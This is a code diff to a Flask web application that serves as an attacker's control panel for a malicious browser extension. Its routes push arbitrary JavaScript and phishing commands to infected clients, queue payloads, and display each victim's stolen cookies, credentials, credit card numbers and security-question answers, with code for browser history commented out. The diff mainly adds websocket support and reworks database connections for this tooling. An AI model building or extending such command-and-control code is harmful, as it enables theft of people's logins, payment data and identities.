@@ -1,14 +1,19 @@
+import eventlet
+eventlet.monkey_patch()
 from flask import Flask, render_template, request, redirect, url_for
 from forms import LoginForm
 from flask_login import logout_user, login_user, login_required, LoginManager, UserMixin
 import database, app
 from app import app as app_flask
+from flask_socketio import SocketIO, emit
 
 
 login_manager = LoginManager()
 login_manager.init_app(app_flask)
 login_manager.login_view = 'login'
 active_users = None
+
+socketio = SocketIO(app_flask, async_mode = 'eventlet')
 
 
 # user class not really sensible because only one attacker but necessary for implementing login
@@ -18,6 +23,7 @@ class User(UserMixin):
 
     def repr(self):
         return "admin"
+
 
 
 @login_manager.user_loader
@@ -41,9 +47,11 @@ def login():
 @app_flask.route('/attackmode', methods=['GET', 'POST'])
 @login_required
 def attack_mode():
-    with database.getConn() as cur:
+    conn = database.getConn()
+    with conn.cursor() as cur:
         cur.execute("SELECT * FROM Client")
         data = cur.fetchall()
+        conn.close()
     active_users = [i[0] for i in app.connected_clients]
     return render_template('index2.html', data=data, active_users=active_users)
 
@@ -63,10 +71,11 @@ def logout():
 
 @app_flask.route('/sendjs', methods=['POST'])
 def sendjs():
+    socketio.emit('connect', {'id':'9999'}, namespace="hi")
     a = request.form['js']
     b = request.form['id']
     c = a + '\n' + b
-    # if active tell extension to send
+    #add_js_command(b, a)
     if (check_status(b)):
         return c
     else:
@@ -79,7 +88,7 @@ def phish():
     d = request.form['id']
     e = "Phish" + request.form['number']
     f = d + '\n' + e
-    # if active tell extension to send
+    # add_phish_command(d, e)
     if (check_status(d)):
         return f
     else:
@@ -90,7 +99,8 @@ def phish():
 @app_flask.route('/getinfo', methods=['POST'])
 def getinfo():
     userid = int(request.form['id'])
-    with database.getConn() as cur:
+    conn = database.getConn()
+    with conn.cursor() as cur:
         cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
         record = cur.fetchone()
         cur.execute('SELECT * FROM Cookies WHERE CID = (%s)', (userid,))
@@ -101,15 +111,23 @@ def getinfo():
         creditcards = cur.fetchall()
         cur.execute('SELECT * FROM SecurityQuestions WHERE CID = (%s)', (userid,))
         questions = cur.fetchall()
+        conn.close()
+
+    head = ""
+    # browser_history = database.get_history(userid)
+    # with open(browser_history) as bh:
+    #     head = [next(bh) for x in range(10)]
+
+
     return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
-                           creditcards=creditcards, questions=questions)
+                           creditcards=creditcards, questions=questions, history = head)
 
 
 def update_payload(id, text):
-    with database.getConn() as cur:
+    conn = database.getConn()
+    with conn.cursor() as cur:
         cur.execute("UPDATE Client SET NextPayload = concat(NextPayload, (%s), '\n') WHERE ID = (%s)", (text, id))
-        cur.commit()
-
+        conn.close()
 
 def check_status(user):
     active_users = [i[0] for i in app.connected_clients]
@@ -119,4 +137,4 @@ def check_status(user):
 
 
 if __name__ == '__main__':
-    app_flask.run(debug=True)
+    socketio.run(app_flask, debug=True)
